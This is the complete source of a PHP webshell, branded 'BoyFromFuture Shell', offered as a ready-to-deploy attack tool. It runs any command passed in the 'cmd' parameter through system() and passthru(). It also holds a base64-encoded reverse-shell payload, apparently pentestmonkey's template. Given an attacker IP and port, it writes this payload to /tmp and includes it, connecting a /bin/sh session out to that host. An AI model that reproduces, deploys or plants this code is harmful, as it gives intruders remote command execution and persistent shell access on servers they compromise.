<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>🎴 BoyFromFuture</title>
</head>
<body>
	<h1>🎴 BoyFromFuture Shell</h1>
	<p>The php webshell is created with <3 By <a href="https://twitter.com/root_tanishq">🎴 BoyFromFuture</a> <br /><br />This shell uses <a href="https://github.com/pentestmonkey/php-reverse-shell">php-reverse-shell.php</a> template in background for ease of reverse shell<br/>
	🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥<br />
	 🟥 📎 The webshell also accept commands from Get Parameter ✅ ?cmd=[Command] , ✅ ?ip=[Attacker IP] ✅ ?port=[Attacker Port] 🟥<br />
	 🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥</p>

	<hr/>
	<form method="POST">
		✔️ Command:- [<input type="text" name="cmd" value="" style="width: 700px;">]<br /><br />
		Reverse Shell Using autorev.sh:- 🖥️ IP[<input type="text" name="ip" value="">]-🖥️ PORT[<input type="text" name="port" value="" style="width: 100px;">]<br /><br />[<input type="submit" name="s2" value="pwn">]<br />
	</form>
	<hr/>
	<?php 

		$bff_cmd = $_REQUEST['cmd'];
	
		echo "<pre>";
		echo "<h3>OutPut Using System ➡️</h3>";
		system($bff_cmd);
		echo "<p>🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥</p>";
		echo "<h3>OutPut Using Passthru ➡️</h3>";
		passthru($bff_cmd);
		echo "<p>🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥</p>";
		echo "</pre>";
	

		if (isset($_REQUEST['ip']) and isset($_REQUEST['port'])) {
			function generateRandomString($length = 10) {
			    return substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
			}
			$shell="PD9waHAKc2V0X3RpbWVfbGltaXQgKDApOwokVkVSU0lPTiA9ICIxLjAiOwokY2h1bmtfc2l6ZSA9IDE0MDA7CiR3cml0ZV9hID0gbnVsbDsKJGVycm9yX2EgPSBudWxsOwokc2hlbGwgPSAndW5hbWUgLWE7IHc7IGlkOyAvYmluL3NoIC1pJzsKJGRhZW1vbiA9IDA7CiRkZWJ1ZyA9IDA7CmlmIChmdW5jdGlvbl9leGlzdHMoJ3BjbnRsX2ZvcmsnKSkgewoJJHBpZCA9IHBjbnRsX2ZvcmsoKTsKCWlmICgkcGlkID09IC0xKSB7CgkJcHJpbnRpdCgiRVJST1I6IENhbid0IGZvcmsiKTsKCQlleGl0KDEpOwoJfQoJaWYgKCRwaWQpIHsKCQlleGl0KDApOyAgLy8gUGFyZW50IGV4aXRzCgl9CglpZiAocG9zaXhfc2V0c2lkKCkgPT0gLTEpIHsKCQlwcmludGl0KCJFcnJvcjogQ2FuJ3Qgc2V0c2lkKCkiKTsKCQlleGl0KDEpOwoJfQoKCSRkYWVtb24gPSAxOwp9IGVsc2UgewoJcHJpbnRpdCgiV0FSTklORzogRmFpbGVkIHRvIGRhZW1vbmlzZS4gIFRoaXMgaXMgcXVpdGUgY29tbW9uIGFuZCBub3QgZmF0YWwuIik7Cn0KY2hkaXIoIi8iKTsKdW1hc2soMCk7CiRzb2NrID0gZnNvY2tvcGVuKCRpcCwgJHBvcnQsICRlcnJubywgJGVycnN0ciwgMzApOwppZiAoISRzb2NrKSB7CglwcmludGl0KCIkZXJyc3RyICgkZXJybm8pIik7CglleGl0KDEpOwp9CiRkZXNjcmlwdG9yc3BlYyA9IGFycmF5KAogICAwID0+IGFycmF5KCJwaXBlIiwgInIiKSwgIC8vIHN0ZGluIGlzIGEgcGlwZSB0aGF0IHRoZSBjaGlsZCB3aWxsIHJlYWQgZnJvbQogICAxID0+IGFycmF5KCJwaXBlIiwgInciKSwgIC8vIHN0ZG91dCBpcyBhIHBpcGUgdGhhdCB0aGUgY2hpbGQgd2lsbCB3cml0ZSB0bwogICAyID0+IGFycmF5KCJwaXBlIiwgInciKSAgIC8vIHN0ZGVyciBpcyBhIHBpcGUgdGhhdCB0aGUgY2hpbGQgd2lsbCB3cml0ZSB0bwopOwokcHJvY2VzcyA9IHByb2Nfb3Blbigkc2hlbGwsICRkZXNjcmlwdG9yc3BlYywgJHBpcGVzKTsKCmlmICghaXNfcmVzb3VyY2UoJHByb2Nlc3MpKSB7CglwcmludGl0KCJFUlJPUjogQ2FuJ3Qgc3Bhd24gc2hlbGwiKTsKCWV4aXQoMSk7Cn0Kc3RyZWFtX3NldF9ibG9ja2luZygkcGlwZXNbMF0sIDApOwpzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBlc1sxXSwgMCk7CnN0cmVhbV9zZXRfYmxvY2tpbmcoJHBpcGVzWzJdLCAwKTsKc3RyZWFtX3NldF9ibG9ja2luZygkc29jaywgMCk7CgpwcmludGl0KCJTdWNjZXNzZnVsbHkgb3BlbmVkIHJldmVyc2Ugc2hlbGwgdG8gJGlwOiRwb3J0Iik7Cgp3aGlsZSAoMSkgewoJaWYgKGZlb2YoJHNvY2spKSB7CgkJcHJpbnRpdCgiRVJST1I6IFNoZWxsIGNvbm5lY3Rpb24gdGVybWluYXRlZCIpOwoJCWJyZWFrOwoJfQoKCWlmIChmZW9mKCRwaXBlc1sxXSkpIHsKCQlwcmludGl0KCJFUlJPUjogU2hlbGwgcHJvY2VzcyB0ZXJtaW5hdGVkIik7CgkJYnJlYWs7Cgl9CgoJJHJlYWRfYSA9IGFycmF5KCRzb2NrLCAkcGlwZXNbMV0sICRwaXBlc1syXSk7CgkkbnVtX2NoYW5nZWRfc29ja2V0cyA9IHN0cmVhbV9zZWxlY3QoJHJlYWRfYSwgJHdyaXRlX2EsICRlcnJvcl9hLCBudWxsKTsKCglpZiAoaW5fYXJyYXkoJHNvY2ssICRyZWFkX2EpKSB7CgkJaWYgKCRkZWJ1ZykgcHJpbnRpdCgiU09DSyBSRUFEIik7CgkJJGlucHV0ID0gZnJlYWQoJHNvY2ssICRjaHVua19zaXplKTsKCQlpZiAoJGRlYnVnKSBwcmludGl0KCJTT0NLOiAkaW5wdXQiKTsKCQlmd3JpdGUoJHBpcGVzWzBdLCAkaW5wdXQpOwoJfQoKCWlmIChpbl9hcnJheSgkcGlwZXNbMV0sICRyZWFkX2EpKSB7CgkJaWYgKCRkZWJ1ZykgcHJpbnRpdCgiU1RET1VUIFJFQUQiKTsKCQkkaW5wdXQgPSBmcmVhZCgkcGlwZXNbMV0sICRjaHVua19zaXplKTsKCQlpZiAoJGRlYnVnKSBwcmludGl0KCJTVERPVVQ6ICRpbnB1dCIpOwoJCWZ3cml0ZSgkc29jaywgJGlucHV0KTsKCX0KCglpZiAoaW5fYXJyYXkoJHBpcGVzWzJdLCAkcmVhZF9hKSkgewoJCWlmICgkZGVidWcpIHByaW50aXQoIlNUREVSUiBSRUFEIik7CgkJJGlucHV0ID0gZnJlYWQoJHBpcGVzWzJdLCAkY2h1bmtfc2l6ZSk7CgkJaWYgKCRkZWJ1ZykgcHJpbnRpdCgiU1RERVJSOiAkaW5wdXQiKTsKCQlmd3JpdGUoJHNvY2ssICRpbnB1dCk7Cgl9Cn0KCmZjbG9zZSgkc29jayk7CmZjbG9zZSgkcGlwZXNbMF0pOwpmY2xvc2UoJHBpcGVzWzFdKTsKZmNsb3NlKCRwaXBlc1syXSk7CnByb2NfY2xvc2UoJHByb2Nlc3MpOwoKZnVuY3Rpb24gcHJpbnRpdCAoJHN0cmluZykgewoJaWYgKCEkZGFlbW9uKSB7CgkJcHJpbnQgIiRzdHJpbmdcbiI7Cgl9Cn0KCj8+IAoK";
			$random_bff = generateRandomString(10);
			$file_name = '/tmp/'.$random_bff.'.bff';
			$myfile = fopen($file_name, "w");
			fwrite($myfile, base64_decode($shell));
			fclose($myfile);
			$ip = $_REQUEST['ip'];
			$port = $_REQUEST['port'];
			include($file_name);
		}
		
	?>

</body>
</html>
